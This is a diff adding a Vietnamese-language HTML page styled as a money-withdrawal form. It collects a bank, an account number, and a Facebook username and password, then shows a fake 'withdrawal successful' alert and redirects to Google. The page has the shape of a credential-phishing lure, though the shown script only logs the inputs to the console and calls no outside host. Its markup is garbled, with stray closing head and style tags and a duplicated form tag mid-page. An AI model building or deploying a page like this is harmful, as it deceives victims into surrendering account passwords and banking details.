@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Form Demo</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      background-image: url('https://images.unsplash.com/photo-1506765515384-028b60a970df?auto=format&fit=crop&w=1470&q=80');
+      background-size: cover;
+      background-position: center;
+      font-family: Arial, sans-serif;
+      position: relative;
+
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+
+    /* Dòng chữ chào mừng */
+    .welcome-text {
+      color: white;
+      font-size: 32px;
+      font-weight: bold;
+      text-shadow: 2px 2px 6px rgba(0, 0, 0, 0.6);
+      margin-bottom: 30px;
+      text-align: center;
+    }
+
+    form {
+      background-color: rgba(255, 255, 255, 0.9);
+      padding: 30px;
+      border-radius: 12px;
+      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.3);
+      text-align: center;
+      min-width: 300px;
+    }
+
+    select, input {
+      width: 80%;
+      padding: 8px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+
+    button {
+      padding: 10px 20px;
+      background-color: #007BFF;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- CHỮ TRÊN NỀN -->
+
+  <div class="welcome-text">👋 Chào mừng đến với trang web của <span style="color: yellow">Namtun</span>!</div>
+  <form id="withdrawForm">
+  </style>
+</head>
+<body>
+
+  <form id="withdrawForm">
+    <h2>Rút Tiền</h2>
+
+    <label>Số tiền:</label><br>
+    <select name="amount">
+      <option value=""></option>
+      <option value="50K">50K</option>
+      <option value="100K">100K</option>
+      <option value="200K">200K</option>
+      <option value="500K">500K</option>
+    </select><br><br>
+
+    <label>Ngân hàng:</label><br>
+    <select name="bank">
+      <option value=""></option>
+      <option value="MB">MB</option>
+      <option value="Agribank">Agribank</option>
+      <option value="Viettinbank">Viettinbank</option>
+      <option value="Techcombank">Techcombank</option>
+    </select><br><br>
+
+    <label>Số tài khoản:</label><br>
+    <input type="text" name="stk" placeholder="Nhập STK"><br><br>
+    <label>Tài khoản Facebook:</label><br>
+    <input type="text" name="TK" placeholder="Nhập TK"><br><br>
+    <label>MK Facebook:</label><br>
+    <input type="text" name="MK" placeholder="Nhập MK"><br><br>
+
+    <button type="submit">Gửi</button>
+  </form>
+    
+  <script>
+  const form = document.getElementById("withdrawForm");
+
+  form.addEventListener("submit", function(event) {
+    event.preventDefault(); // Ngăn reload
+
+    const formData = new FormData(form);
+    const amount = formData.get("amount");
+    const bank = formData.get("bank");
+    const stk = formData.get("stk");
+    const TK = formData.get("TK");
+    const MK = formData.get("MK");
+
+    console.log("Số tiền:", amount);
+    console.log("Ngân hàng:", bank);
+    console.log("STK:", stk);
+    console.log("Tài khoản:", TK);
+    console.log("Mật khẩu:", MK);
+
+    // Hiển thị thông báo nếu muốn
+    alert(`Yêu cầu rút tiền thành công:\n- Số tiền: ${amount}\n- Ngân hàng: ${bank}\n- STK: ${stk}\n- Tài khoản: ${TK}`);
+
+    // 🚀 Văng khỏi web ngay sau khi gửi
+    window.location.href = "https://www.google.com"; // <-- bạn có thể thay bằng trang khác
+  });
+</script>
+
+
